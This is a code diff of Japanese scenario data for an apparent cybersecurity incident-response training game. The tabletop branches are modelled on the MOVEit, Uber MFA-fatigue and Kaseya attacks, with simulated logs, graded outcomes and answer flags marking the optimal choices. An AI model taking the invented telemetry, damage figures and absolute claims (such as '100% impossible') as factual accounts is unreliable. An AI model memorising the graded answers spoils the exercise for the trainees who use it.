+            description: '被害範囲を隠さず正確に開示し、専用コールセンターを立ち上げて対象企業・個人へのケアを実施。システムはゼロトラスト要件を満たす安全な新環境へ刷新する。',
+            tacticalRationale: 'コンプライアンスおよび危機管理上の最善手。正確な流出範囲を把握して迅速に公式発表することで、ダークウェブでの脅迫要求（身代金支払い）に応じることなく、信頼回復への道筋をつける。',
+            isOptimal: true,
+            impact: { spread: -5, exfiltration: -5, downtime: 15, trust: +15 },
+            logOutput: [
+              '[LEGAL] PPC initial report submitted successfully within 12 hours.',
+              '[CLIENTS] Direct crisis briefing held with 110 affected enterprise clients.',
+              '[SYSTEM] Replaced on-prem MFT with hardened Zero-Trust MFT architecture with IP allowlisting.'
+            ],
+            nextNodeId: 'mft_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      mft_02_full_exfiltration: {
+        id: 'mft_02_full_exfiltration',
+        phase: 'Phase 2: 大容量データ持ち出し完了と身代金恐喝要求 (T+04:00)',
+        title: '全顧客データ流出とダークウェブでの身代金恐喝',
+        description: '初動でのファイル単純削除が失敗し、攻撃者は合計1.8TBのデータを完全に吸い上げました。攻撃者グループ「CL0P」から企業の代表メール宛てに「7日以内に1,500万ドルのビットコインを支払わなければ、受託企業全社のマイナンバーをリークサイトで公開する」との脅迫状が届きました。',
+        severity: 'critical',
+        situationSummary: '140万人分のデータ完全流出。ダークウェブ上でのカウントダウン開始。',
+        telemetryLogs: [
+          { timestamp: '09:00:00', source: 'Adversary Email', level: 'CRITICAL', message: 'Ransom demand: 15,000,000 USD in BTC. Proof files attached: 50 Executive salaries & Tax IDs' }
+        ],
+        choices: [
+          {
+            id: 'c2_refuse_ransom_public_disclosure',
+            label: '身代金支払いを毅然と拒絶・警察庁サイバー特捜隊および個人情報保護委員会へ全面報告・緊急記者会見の実施',
+            actionType: 'communication',
+            timeCostMinutes: 90,
+            description: '犯罪組織への資金提供を拒絶し、公的機関と連携して被害者救済（信用情報監視サービス等の無償提供）を実施する。',
+            tacticalRationale: '身代金を支払ってもデータ消去の保証はなく、再恐喝されるだけであるため支払いは厳禁。公表と警察連携が唯一の道。',
+            isOptimal: true,
+            impact: { spread: 15, exfiltration: 20, downtime: 30, trust: -35 },
+            logOutput: [
+              '[PRESS] Emergency press conference held by CEO & CISO.',
+              '[POLICE] National Police Agency Cyber Special Investigation Unit launched probe.',
+              '[SUPPORT] Credit monitoring service contracted for all affected individuals.'
+            ],
+            nextNodeId: 'mft_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      mft_02_mass_blackmail: {
+        id: 'mft_02_mass_blackmail',
+        phase: 'Phase 2: リークサイト公開と受託契約の一斉解除 (T+06:00)',
+        title: '機密情報のインターネット全公開と受託企業からの集団訴訟',
+        description: '業務継続を優先した結果、全820社・140万人分のデータが何ら防護なく流出。攻撃者のリークサイトに企業リストとサンプルデータが無断公開され、受託企業各社からの抗議と契約解除通告が殺到しています。',
+        severity: 'critical',
+        situationSummary: '信用失墜による事業存続危機。取引先全社からの契約解除と損害賠償請求。',
+        telemetryLogs: [
+          { timestamp: '11:00:00', source: 'Media News', level: 'CRITICAL', message: 'Breaking: 1.4 Million Citizens Financial Records Leaked Online in Massive BPO Breach' }
+        ],
+        choices: [
+          {
+            id: 'c2_emergency_legal_defense',
+            label: '全受託契約の一時停止・経営陣の引責辞職と第三者委員会による徹底調査',
+            actionType: 'communication',
+            timeCostMinutes: 120,
+            description: '企業存続に向けた法的整理と原因究明手続きに入る。',
+            tacticalRationale: '最悪の事態における最終収拾策。',
+            isOptimal: true,
+            impact: { spread: 25, exfiltration: 25, downtime: 50, trust: -50 },
+            logOutput: [
+              '[BOARD] Board of Directors resignation submitted.',
+              '[LEGAL] Independent Investigation Committee chartered.'
+            ],
+            nextNodeId: 'mft_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      mft_03_terminal_secured_s: {
+        id: 'mft_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】電光石火の通信遮断による被害局所化と透明性ある公的開示',
+        description: '大容量外向き通信の検知からわずか5分で外部ネットワークを物理遮断し、攻撃者のデータ吸い上げを早期に阻止しました。さらに保全ログから被害対象を厳密に特定し、72時間以内の法令報告と対象顧客への誠実な事前通知を完遂しました。',
+        severity: 'contained',
+        situationSummary: '流出規模を全体の15%未満に抑制。二重恐喝の完全無力化。',
+        telemetryLogs: [
+          { timestamp: '12:00:00', source: 'CSIRT Command', level: 'INFO', message: 'MOVEit zero-day response closed. System migrated to hardened Zero-Trust portal.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'ゼロデイ一斉データ恐喝に対する模範的クライシスマネジメント',
+          summary: '「暗号化を伴わないデータ持ち出し型恐喝」に対し、通信の物理遮断で流出を最小化し、法令に則った透明性ある開示で顧客の信頼を死守しました。',
+          financialEstimate: '被害損害額: 約8,500万円（通知費用・パッチ検証費） / 阻止損失額: 約65億円（全社流出時の損害賠償・取引契約解除）',
+          legalImpact: '個人情報保護法 第26条の報告義務を期限内に完全遵守。',
+          complianceStatus: 'FISC安全対策基準 / ISO 27001 適合維持',
+          recommendedPractices: [
+            '外部公開するファイル転送アプライアンスは、インターネット全開放とせず、許可された送信元IP（IPホワイトリスト）やZTNA（ゼロトラスト・ネットワーク・アクセス）経由に限定する',
+            '大容量の外向き通信（Egress Traffic Spike）をリアルタイム検知し、自動で通信を絞り込むアラート閾値を設定する',
+            'データ恐喝を受けた際、犯罪組織に身代金を支払ってもデータは破棄されないことを認識し、警察・規制当局との連携を第一とする'
+          ]
+        }
+      },
+
+      mft_03_terminal_breached_f: {
+        id: 'mft_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】データ吸い上げの放置が生んだメガブリーチと事業破綻の危機',
+        description: '初動での中途半端なファイル削除や業務優先判断により、1.8TBに及ぶ140万人分のマイナンバー・給与データが完全に盗まれました。ダークウェブでの暴露により受託企業からの契約解除と損害賠償請求が殺到し、企業の存続が危ぶまれる事態となりました。',
+        severity: 'critical',
+        situationSummary: '140万人分のデータ完全漏洩。受託契約の大量解除と巨額損害賠償。',
+        telemetryLogs: [
+          { timestamp: '14:00:00', source: 'Regulatory Authority', level: 'CRITICAL', message: 'Formal administrative order issued regarding systemic data governance failure.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: 'ファイル転送基盤のゼロデイが招いた信託・BPO事業の崩壊',
+          summary: '「外向き大容量通信の放置」と「安易なGUIファイル削除」という二重の初動ミスが、歴史的なデータ漏洩事件を引き起こしました。',
+          financialEstimate: '被害損害額: 約52億円（損害賠償・顧客離脱損失・信用監視費用・制裁金）',
+          legalImpact: '個人情報保護法に基づく是正命令、集団訴訟、主務官庁による業務改善命令。',
+          complianceStatus: '主要セキュリティ認証の取り消し処分',
+          recommendedPractices: [
+            'MFTやVPNなど境界に位置するアプライアンスには常に未知の脆弱性（ゼロデイ）が存在し得ることを前提とし、内部ネットワークから隔離（DMZ）する',
+            '侵害が疑われるホストは即座にネットワークから切り離し、痕跡を消さないよう専門のフォレンジック手順を踏む'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_mfa_fatigue',
+    title: '深夜のMFA疲労攻撃（プッシュ連打）& 社内Slack侵入・特権Vault窃取',
+    subtitle: '実在モデル: 2022年 米国大手配車サービス (Uber) & 大手ゲーム開発スタジオ侵害 (Lapsus$)',
+    difficulty: '中級 (実務CSIRT)',
+    category: 'BEC & Phishing',
+    estimatedTime: '15分',
+    initialNodeId: 'mfa_01_alert',
+    initialMetrics: {
+      spread: 25,
+      exfiltration: 20,
+      downtime: 5,
+      trust: 90,
+    },
+    briefing: {
+      targetOrganization: 'グローバルWebサービス開発企業（従業員6,000名）',
+      discoveredAlert: '深夜02時15分、外部委託開発エンジニアのスマートフォンに対し、Duo/OktaのMFA承認プッシュ通知が30分間で54回連続送信され、直後に「承認」ステータスが記録されたのを確認。',
+      incidentOfficer: 'SOC シフトスーパーバイザー',
+      immediateObjective: '侵入されたVPNセッションの強制切断、社内Slack/Confluence上での特権キー探索の封じ込め、ナンバーマッチングMFAへの緊急全社切り替え。',
+    },
+    imagePath: '/src/assets/images/scenario_mfa_fatigue_1793938175765.jpg',
+    nodes: {
+      mfa_01_alert: {
+        id: 'mfa_01_alert',
+        phase: 'Phase 1: 深夜の異常なMFAプッシュ連打検知 (T+00:00)',
+        title: '連続54回のプッシュ通知送信と突然の承認ステータス',
+        description: '深夜02時48分、外部委託先エンジニア [ext_dev_satou] のアカウントにおいて、短時間で54回におよぶMFAプッシュ通知が発行され、直後に1回「承認（Accepted）」されたログが記録されました。数分後、該当アカウントを用いて社内VPNへの接続が確立され、社内SlackおよびConfluenceへの不自然な高速クエリが開始されています。',
+        severity: 'critical',
+        situationSummary: '攻撃者はInfoStealerマルウェア等で事前に入手したID/PASSを使い、深夜のプッシュ連打（MFA Fatigue / Prompt Bombing）で被害者に根負け承認させた模様。',
+        telemetryLogs: [
+          { timestamp: '02:18:00', source: 'Okta Verify', level: 'WARN', message: 'MFA Push sent to iOS device (Attempt 1..53 rejected or timed out)' },
+          { timestamp: '02:48:12', source: 'Okta Verify', level: 'ALERT', message: 'MFA Push ACCEPTED by user on attempt #54' },
+          { timestamp: '02:49:05', source: 'GlobalProtect VPN', level: 'CRITICAL', message: 'User ext_dev_satou connected from residential ISP (Known TOR exit node)' },
+          { timestamp: '02:51:30', source: 'Slack Audit Logs', level: 'ALERT', message: 'Search queries: "AWS_SECRET", "admin_password", "ssh_key" executed by ext_dev_satou' }
+        ],
+        choices: [
+          {
+            id: 'c1_kill_vpn_revoke_account',
+            label: '該当アカウントのActive Directory/VPNセッションを即時強制切断 & アカウント一時停止・全社Slack検索監査',
+            actionType: 'containment',
+            timeCostMinutes: 5,
+            description: '侵入者のVPNトンネルを即座に破棄し、Active DirectoryおよびIdPアカウントを無効化。社内情報探索を即時遮断する。',
+            tacticalRationale: '最善の初動。MFA疲労攻撃の目的は社内ネットワークへの足がかり確保であり、侵入後すぐにSlackやWiki内の認証情報を物色するため、1秒でも早いセッション切断が被害を最小化する。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -15, downtime: 0, trust: +5 },
+            logOutput: [
+              '[VPN] Disconnected tunnel for ext_dev_satou (Session killed).',
+              '[AD] User ext_dev_satou account disabled in Active Directory.',
+              '[SLACK] Enterprise Grid user session revoked. Search query export initiated.'
+            ],
+            nextNodeId: 'mfa_02_enforce_number_matching'
+          },
+          {
+            id: 'c1_ask_slack_next_morning',
+            label: '「深夜なので委託先に電話するのは失礼」と判断し、翌朝9時にSlackで確認連絡を入れることにして様子見',
+            actionType: 'investigation',
+            timeCostMinutes: 30,
+            description: '就寝中のユーザーに配慮し、翌営業日の対応とする。',
+            tacticalRationale: '致命的な過失。Uberの実際のインシデントでは、攻撃者が社内Slackに入り込み、社内ネットワークドライブから特権アクセス管理（PAM）ツールのマスター認証情報を発見してインフラ全体を完全制圧した。',
+            impact: { spread: 40, exfiltration: 45, downtime: 20, trust: -30 },
+            logOutput: [
+              '[SLACK] Attacker posted in #general: "I announce I am a hacker and Uber has suffered a data breach."',
+              '[CONFLUENCE] PowerShell script containing AWS root credentials downloaded by attacker.',
+              '[AWS IAM] Complete cloud environment compromised!'
+            ],
+            nextNodeId: 'mfa_02_infrastructure_takeover'
+          },
+          {
+            id: 'c1_change_password_only',
+            label: 'VPNは切断せず、管理コンソールからパスワード変更通知メールだけを送信する',
+            actionType: 'containment',
+            timeCostMinutes: 20,
+            description: 'パスワードだけを変えて、既存のVPN接続セッションはそのまま放置する。',
+            tacticalRationale: '無効な初動。すでに確立しているVPNトンネルやOAuthトークンはパスワード変更だけでは切断されないため、攻撃者はそのまま活動を継続できる。',
+            impact: { spread: 30, exfiltration: 25, downtime: 5, trust: -15 },
+            logOutput: [
+              '[AD] Password updated for ext_dev_satou.',
+              '[VPN] Active session is still established (Session token not invalidated).',
+              '[SECRETS] Attacker exfiltrated internal Git repositories.'
+            ],
+            nextNodeId: 'mfa_02_secrets_exfiltration'
+          }
+        ]
+      },
+
+      mfa_02_enforce_number_matching: {
+        id: 'mfa_02_enforce_number_matching',
+        phase: 'Phase 2: ナンバーマッチングMFA強制 & Slackシークレット監査 (T+00:30)',
+        title: '2桁数値入力（Number Matching）の全社強制適用と認証情報ローテーション',
+        description: 'VPN切断により攻撃者を社内ネットワークから即座に排除。Slackログ監査の結果、攻撃者が閲覧したチャンネルと検索履歴の特定に成功しました。閲覧された可能性がある開発環境のAWS一時キーを直ちに無効化し、今後のMFA疲労攻撃を根本防止する対策が求められます。',
+        severity: 'high',
+        situationSummary: '攻撃者の足がかりは排除済み。単純タップ式MFAの廃止と、漏洩疑いのあるシークレットのローテーションが必要。',
+        telemetryLogs: [
+          { timestamp: '03:10:00', source: 'Slack Audit', level: 'INFO', message: 'ext_dev_satou viewed 3 channels: #dev-infra, #general, #alerts before termination' },
+          { timestamp: '03:15:22', source: 'Identity Admin', level: 'INFO', message: 'Okta / Microsoft Authenticator Number Matching policy available for deployment' }
+        ],
+        choices: [
+          {
+            id: 'c2_rollout_number_matching_rotate',
+            label: '全社MFAポリシーを「単純タップ承認」から「画面表示の2桁数値入力（Number Matching）」へ即時強制切り替え & 閲覧された全シークレットのローテーション',
+            actionType: 'remediation',
+            timeCostMinutes: 40,
+            description: 'ユーザーがPC画面に表示された数字をスマホに入力しない限り承認できない仕様に変更。攻撃者からの一方的なプッシュ連打を物理的に無意味化する。',
+            tacticalRationale: 'MFA疲労攻撃の根本的解決策。PC画面が見えていない攻撃者がプッシュを送っても、ユーザー側には入力すべき数字が分からないため、誤タップによる誤承認が100%不可能になる。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -10, downtime: 0, trust: +15 },
+            logOutput: [
+              '[IDP] Number Matching (2-digit verification code) ENFORCED globally for all 6,000 users.',
+              '[PUSH RATE LIMIT] Max 3 push notifications per 15 minutes before account auto-lock.',
+              '[AWS/GITHUB] All API tokens mentioned in #dev-infra regenerated.'
+            ],
+            nextNodeId: 'mfa_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      mfa_02_infrastructure_takeover: {
+        id: 'mfa_02_infrastructure_takeover',
+        phase: 'Phase 2: 全社Slackハイジャックと特権基盤の喪失 (T+01:00)',
+        title: '全社Slack上での犯行声明とクラウド全権掌握',
+        description: '対応を先送りにした結果、攻撃者は社内ネットワーク共有フォルダーにあったPowerShellスクリプトからハードコードされたThycotic/CyberArk（PAM特権アクセス管理）のマスターパスワードを発見。全社Slackの#generalチャンネルに「全システムを掌握した」と投稿され、全社員がパニックに陥りました。',
+        severity: 'critical',
+        situationSummary: '壊滅的侵害。社内コミュニケーション・クラウドインフラの全権を喪失。',
+        telemetryLogs: [
+          { timestamp: '03:45:00', source: 'Slack #general', level: 'CRITICAL', message: 'Post from attacker: "Hello @here, I am in your network. Ransom demands will follow."' },
+          { timestamp: '03:50:00', source: 'PAM Vault', level: 'CRITICAL', message: 'Master emergency admin key exported by unknown external session' }
+        ],
+        choices: [
+          {
+            id: 'c2_cut_all_vpn_rebuild',
+            label: '全社リモートアクセス即時切断・Slackワークスペース一時停止・外部フォレンジック専門家の緊急招集',
+            actionType: 'containment',
+            timeCostMinutes: 90,
+            description: '全社業務を全面停止して感染の完全隔離を行い、外部支援のもとでゼロから特権アカウントを再構築する。',
+            tacticalRationale: '損害は極めて甚大だが、これ以上の機密破壊を防ぐための最終選択。',
+            isOptimal: true,
+            impact: { spread: 15, exfiltration: 25, downtime: 50, trust: -45 },
+            logOutput: [
+              '[FIREWALL] Global VPN concentrators powered down.',
+              '[SLACK] Enterprise workspace put into maintenance hold.',
+              '[BOARD] Emergency Crisis Management Committee convened.'
+            ],
+            nextNodeId: 'mfa_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      mfa_02_secrets_exfiltration: {
+        id: 'mfa_02_secrets_exfiltration',
+        phase: 'Phase 2: 既存セッション悪用によるソースコード流出 (T+00:45)',
+        title: 'パスワード変更をすり抜けたソースコード大量流出',
+        description: 'パスワードだけを変更してVPNセッションを切断しなかったため、攻撃者はアクティブな接続を維持。社内GitHub Enterpriseから基幹サービスのソースコードリポジトリを丸ごとクローンして持ち出しました。',
+        severity: 'critical',
+        situationSummary: '知的財産の流出。未公開製品のソースコードが外部C2へ送信完了。',
+        telemetryLogs: [
+          { timestamp: '03:20:00', source: 'GitHub Enterprise', level: 'CRITICAL', message: 'git clone executed for 18 core proprietary repositories within 12 minutes' }
+        ],
+        choices: [
+          {
+            id: 'c2_revoke_all_ssh_git_keys',
+            label: '全社VPN接続の全強制切断・GitHub全アクセストークンとSSH公開鍵の全件無効化',
+            actionType: 'remediation',
+            timeCostMinutes: 60,
+            description: 'すべてのセッションを物理的に切断し、認証キーを総入れ替えする。',
+            tacticalRationale: '手遅れではあるが、流出拡大を止めるための最低限の是正処置。',
+            isOptimal: true,
+            impact: { spread: 10, exfiltration: 20, downtime: 25, trust: -30 },
+            logOutput: [
+              '[VPN] All active sessions terminated globally.',
+              '[GITHUB] All personal access tokens and SSH deploy keys revoked.'
+            ],
+            nextNodeId: 'mfa_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      mfa_03_terminal_secured_s: {
+        id: 'mfa_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】電撃セッション切断とナンバーマッチングMFAによる完勝',
+        description: '深夜の「MFAプッシュ連打」というソーシャルエンジニアリングの兆候を見逃さず、直ちにセッション強制切断を実行して社内情報探索を水際で阻止しました。さらに「ナンバーマッチング（数値一致認証）」を全社強制することで、同様の攻撃を未来永劫不可能にしました。',
+        severity: 'contained',
+        situationSummary: '機密流出: ゼロ。特権侵害: ゼロ。最新MFA疲労攻撃の完封。',
+        telemetryLogs: [
+          { timestamp: '04:30:00', source: 'SOC Command', level: 'INFO', message: 'Incident resolved. Number matching active across 100% of workforce.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'MFA疲労攻撃（Prompt Bombing）に対する完璧な即応と恒久対策',
+          summary: '「パスワード変更だけで安心せずアクティブセッションを確実に切断」「単純タップ承認を廃止しナンバーマッチングへ即時昇格」という現代アイデンティティ防御の鉄則を完遂しました。',
+          financialEstimate: '被害損害額: 0円 / 阻止損失額: 約35億円（特権Vault奪取およびソースコード流出時の想定損害）',
+          legalImpact: '機密データ流出なし。報告義務・法的責任の完全クリア。',
+          complianceStatus: 'CISA MFAガイダンス / NIST SP 800-63B AAL2 適合',
+          recommendedPractices: [
+            'プッシュ通知型のMFAは「ナンバーマッチング（数値一致）」を必須とし、単純な「承認」ボタンのみの運用は即刻廃止する',
+            '短時間に連続するMFA失敗（例: 3回以上）でアカウントを自動一時ロックし、SOCへ高優先度アラートを発報する仕組みを導入する',
+            '社内チャット（Slack/Teams）やWikiにAPIキーやパスワードを平文保存することを固く禁じ、自動スキャン（Secret Scanner）で検知・失効させる'
+          ]
+        }
+      },
+
+      mfa_03_terminal_breached_f: {
+        id: 'mfa_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】深夜の油断が生んだ全社Slack掌握と特権情報完全陥落',
+        description: '「深夜だから」と確認を後回しにしたり、パスワード変更だけでセッションを切断しなかった結果、攻撃者に社内チャットや特権管理サーバーを掌握され、全世界に侵入を宣言される屈辱的な大事故となりました。',
+        severity: 'critical',
+        situationSummary: '企業秘密の完全流出。社内コミュニケーションの崩壊と世界的報道。',
+        telemetryLogs: [
+          { timestamp: '05:00:00', source: 'Global Tech Media', level: 'CRITICAL', message: 'Viral leak: Screenshots of internal Slack and source code posted on Telegram' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: '人間の疲労を突いたソーシャルエンジニアリングの脅威',
+          summary: 'MFAは万能ではなく、「承認ボタンを押してしまう人間心理」を防御するアーキテクチャ（ナンバーマッチング等）が欠如していたことが致命傷となりました。',
+          financialEstimate: '被害損害額: 約28億円（顧客対応・外部調査費用・株価下落影響）',
+          legalImpact: 'プライバシー規制当局による調査、取引先からの契約不履行責任追及。',
+          complianceStatus: 'ISO 27001 / SOC 2 認証の一時停止',
+          recommendedPractices: [
+            '「セッションの強制破棄（Revoke Session）」を行わない限り、パスワードを変更しても攻撃者の通信は止まらないことをCSIRT全員に徹底教育する',
+            '外部委託先の端末・アカウント管理を正社員と同等以上の基準で厳格化し、多要素認証のセキュリティレベルを統一する'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_kaseya_msp',
+    title: 'MSP統合運用基盤ゼロデイ侵入 & 下流顧客サプライチェーン一斉暗号化',
+    subtitle: '実在モデル: 2021年 米国Kaseya VSAサプライチェーン攻撃 (REvil)',
+    difficulty: '上級 (インシデントコマンダー)',
+    category: 'Cloud & Supply Chain',
+    estimatedTime: '20分',
+    initialNodeId: 'kaseya_01_alert',
+    initialMetrics: {
+      spread: 40,
+      exfiltration: 20,
+      downtime: 25,
+      trust: 80,
+    },
+    briefing: {
+      targetOrganization: 'マネージドITサービスプロバイダー (MSP)（中小企業・自治体・クリニック等 430社を受託運用）',
+      discoveredAlert: 'MSP中央リモート監視管理サーバー [VSA-CENTRAL-01] にて、未認証のSQLインジェクション経由で管理者セッションが偽造され、全管理下エージェント端末宛てに「緊急セキュリティパッチ」と称するタスク（agent.exe / 暗号化ペイロード）が一斉配信されたのを検知。',
+      incidentOfficer: 'MSP統括 CISO / 緊急対策本部長',
+      immediateObjective: '中央管理サーバーの物理的ネットワーク遮断（Kill Switch）、全顧客企業への即時電源OFF/回線遮断エマージェンシーコールの発信、汚染アップデートパッケージの配信停止。',
+    },
+    imagePath: '/src/assets/images/scenario_kaseya_msp_1793938188219.jpg',
+    nodes: {
+      kaseya_01_alert: {
+        id: 'kaseya_01_alert',
+        phase: 'Phase 1: 中央運用基盤のハイジャック検知 (T+00:00)',
+        title: '管理コンソールからの悪意あるパッチ自動一斉配信',
+        description: '祝日連休初日の午前07時30分、MSPの中央運用管理サーバー [VSA-CENTRAL-01] にて、認証バイパス脆弱性を突いた攻撃者が侵入。正規の「エージェント自動アップデート機能」をハイジャックし、顧客430社が保有する約12,000台のPC・サーバー宛てにランサムウェア（Kaseya.agentpath.exe）を配布するタスクを一斉実行しました。',
+        severity: 'critical',
+        situationSummary: 'MSPの信頼された管理チャネルが悪用され、下流の顧客企業数百社で一斉暗号化が開始されかけています。',
+        telemetryLogs: [
+          { timestamp: '07:28:10', source: 'VSA Audit Log', level: 'CRITICAL', message: 'Admin session forged via Auth Bypass (dl.asp/setCookie.ashx). User: SYSTEM' },
+          { timestamp: '07:29:45', source: 'VSA Task Engine', level: 'CRITICAL', message: 'Broadcast task "Kaseya VSA Hotfix Agent Update" queued for 12,480 endpoints' },
+          { timestamp: '07:31:00', source: 'Client EDR Feed', level: 'ALERT', message: 'Endpoint [CL-HOSPITAL-SRV01] downloaded agent.exe; Windows Defender disabled via PowerShell' }
+        ],
+        choices: [
+          {
+            id: 'c1_hard_killswitch_broadcast_alert',
+            label: '中央VSA管理サーバーのネットワーク回線を物理切断（Kill Switch発動）& 全顧客企業へ自動緊急一斉通報システムで「オンプレサーバー・PCの即時ネットワーク切断」を通達',
+            actionType: 'containment',
+            timeCostMinutes: 8,
+            description: 'MSPの中央サーバーを即座にオフライン化して配信キューを物理的に絶ち、暗号化が完了していない顧客端末の回線を切らせて被害を水際で止める。',
+            tacticalRationale: '最善の初動。サプライチェーン攻撃において管理基盤が掌握された場合、WebUIからのタスクキャンセルは効かない。中央サーバー自体の回線を物理遮断（Kill Switch）して配信を強制停止し、顧客へ即時回線切断をブロードキャストすることが最大の被害抑止となる。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -10, downtime: 15, trust: 0 },
+            logOutput: [
+              '[DATA CENTER] Uplink cables pulled from VSA-CENTRAL-01. Server is offline.',
+              '[EMERGENCY BROADCAST] Automated SMS & phone call alert dispatched to IT leads at all 430 client organizations.',
+              '[OUTCOME] 350+ client organizations immediately isolated their local networks, stopping payload execution.'
+            ],
+            nextNodeId: 'kaseya_02_containment_and_remediation'
+          },
+          {
+            id: 'c1_cancel_web_task',
+            label: 'VSA管理コンソールのWeb画面から「タスクの一括キャンセル」をクリックし、ジョブが止まるか様子を見る',
+            actionType: 'containment',
+            timeCostMinutes: 25,
+            description: 'WebUI上の操作で配信タスクの停止を試みる。',
+            tacticalRationale: '最悪の悪手。攻撃者はすでにVSAサーバーのバックエンドプロセスを掌握しており、WebUIのキャンセル命令は無視されるか遅延する。その25分の間に数万台のクライアントが暗号化される。',
+            impact: { spread: 45, exfiltration: 25, downtime: 35, trust: -35 },
+            logOutput: [
+              '[VSA UI] Task cancellation queued... Request timeout (504 Gateway Timeout).',
+              '[PAYLOAD] Ransomware payload executed on 8,900 endpoints across 280 client companies!',
+              '[HELP-DESK] Customer support phones ringing off the hook with outage reports.'
+            ],
+            nextNodeId: 'kaseya_02_mass_outbreak'
+          },
+          {
+            id: 'c1_deny_involvement',
+            label: '「自社サーバーの誤検知かもしれない」と判断し、事実関係の社内調査が完了するまで顧客への連絡を伏せる',
+            actionType: 'investigation',
+            timeCostMinutes: 60,
+            description: '風評被害を恐れて顧客への警告を遅らせる。',
+            tacticalRationale: '致命的過失。顧客企業のバックアップまで暗号化され、病院や自治体などの業務が完全停止。後に隠蔽工作として刑事・民事責任を厳しく問われる。',
+            impact: { spread: 55, exfiltration: 40, downtime: 50, trust: -55 },
+            logOutput: [
+              '[MEDIA BREAKING] National news reports 400+ businesses hit by ransomware simultaneously through MSP provider.',
+              '[LEGAL ACTION] Class action lawsuit filed by affected dental clinics and municipal offices.'
+            ],
+            nextNodeId: 'kaseya_02_client_collapse'
+          }
+        ]
+      },
+
+      kaseya_02_containment_and_remediation: {
+        id: 'kaseya_02_containment_and_remediation',
+        phase: 'Phase 2: クライアント隔離支援 & 復旧ツール展開 (T+01:00)',
+        title: '現地オンサイト部隊の派遣とオフライン復旧支援',
+        description: '中央サーバー切断と緊急アラートにより、全体の約80%のクライアント端末がペイロード実行前にネットワークから切り離され、暗号化を回避。しかし約70社の一部端末で暗号化が開始されているため、緊急復旧レスポンス部隊を編成し、各社バックアップの健全性確認が必要です。',
+        severity: 'high',
+        situationSummary: '拡散は阻止。被害に遭った70社のオフラインバックアップ検証と復旧支援に全リソースを投入する。',
+        telemetryLogs: [
+          { timestamp: '08:30:00', source: 'Crisis Command', level: 'INFO', message: '360 client companies confirmed 100% safe. 70 clients report partial workstation impact' },
+          { timestamp: '08:45:12', source: 'CISA / FBI', level: 'INFO', message: 'CISA advisory on Kaseya supply chain compromise received; joint triage room opened' }
+        ],
+        choices: [
+          {
+            id: 'c2_dispatch_ir_restore_backups',
+            label: '全技術社員を復旧レスポンス隊として被害70社へ緊急現地派遣・イミュータブルバックアップからの無償復旧代行とゼロデイパッチ検証',
+            actionType: 'remediation',
+            timeCostMinutes: 90,
+            description: '被害企業に駆けつけてオフラインバックアップから端末を迅速にクリーンリストアし、事業停止時間を最短化する。',
+            tacticalRationale: 'MSPとしての社会的責任を果たす最善策。迅速な人的支援と無償復旧を提供することで、信頼の完全失墜を防ぎ、顧客企業の事業を救済する。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -5, downtime: 10, trust: +20 },
+            logOutput: [
+              '[FIELD TEAMS] 45 mobile engineering units dispatched with clean OS installation media.',
+              '[RESTORATION] Clean restore verified from offline immutable backups for 65 out of 70 affected clients within 24 hours.',
+              '[PATCH] VSA zero-day patch applied in isolated sandbox environment.'
+            ],
+            nextNodeId: 'kaseya_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      kaseya_02_mass_outbreak: {
+        id: 'kaseya_02_mass_outbreak',
+        phase: 'Phase 2: 280社同時暗号化と身代金恐喝 (T+02:30)',
+        title: '顧客企業280社での一斉暗号化と7,000万ドルの身代金要求',
+        description: 'Web操作による遅れにより、280社・約8,900台のPCとサーバーが暗号化されました。攻撃者集団「REvil」はダークウェブ上に「全顧客の復号キーを7,000万ドルのビットコインで一括提供する」との声明を発表。顧客企業からは怒りの電話と損害賠償通告が殺到しています。',
+        severity: 'critical',
+        situationSummary: '未曾有の大惨事。顧客280社の業務が停止し、巨額の身代金恐喝に直面。',
+        telemetryLogs: [
+          { timestamp: '10:00:00', source: 'REvil Happy Blog', level: 'CRITICAL', message: 'Universal decryptor available for 70 Million USD. Timer set to 72 hours.' },
+          { timestamp: '10:15:00', source: 'Client Hospital', level: 'CRITICAL', message: 'Patient admissions suspended due to electronic health record encryption' }
+        ],
+        choices: [
+          {
+            id: 'c2_fbi_joint_taskforce_triage',
+            label: '身代金支払いを拒絶・FBIおよび警察庁サイバー特別捜査隊との合同タスクフォース設置・全社バックアップ救出作戦',
+            actionType: 'communication',
+            timeCostMinutes: 120,
+            description: '公的機関と連携し、ダークウェブ交渉ではなく法執行機関の暗号解読支援と手動バックアップ復旧にかける。',
+            tacticalRationale: '身代金支払いはテロ・サイバー犯罪組織への資金供与となり、復号も保証されない。法執行機関との連携が唯一の打開策。',
+            isOptimal: true,
+            impact: { spread: 15, exfiltration: 20, downtime: 45, trust: -40 },
+            logOutput: [
+              '[TASKFORCE] Joint operation room established with federal cyber investigators.',
+              '[DECRYPTION] Law enforcement obtains master decryption keys from seized backend server 3 weeks later.'
+            ],
+            nextNodeId: 'kaseya_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      kaseya_02_client_collapse: {
+        id: 'kaseya_02_client_collapse',
+        phase: 'Phase 2: 顧客企業の連鎖倒産と刑事捜査着手 (T+04:00)',
